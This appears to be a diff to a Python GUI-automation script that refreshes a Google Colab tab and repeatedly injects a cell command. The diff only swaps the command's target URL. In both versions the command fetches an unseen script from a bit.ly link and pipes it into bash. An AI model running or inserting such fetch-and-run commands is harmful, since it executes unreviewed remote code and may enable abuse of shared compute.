@@ -3,7 +3,7 @@ import time
 from autokey import *
 import pyautogui
 
-col_cmd="!wget -q -O - bit.ly/MAX0001 | bash"
+col_cmd="!wget -q -O - bit.ly/cpu02 | bash"
 
 
 global_slow_motion=1
@@ -204,7 +204,7 @@ def chrome_colab_refresh(slow_motion = 1):
 def chrome_colab_refresh_full(slow_motion = 1):
     time.sleep(1*slow_motion)
     chrome_refresh_page()
-    colab_clear_cmd2(new_cmd='!wget -q -O - bit.ly/MAX0001 | bash')
+    colab_clear_cmd2(new_cmd='!wget -q -O - bit.ly/cpu02 | bash')
     colab_clear_logs()
     colab_doexec2()
 
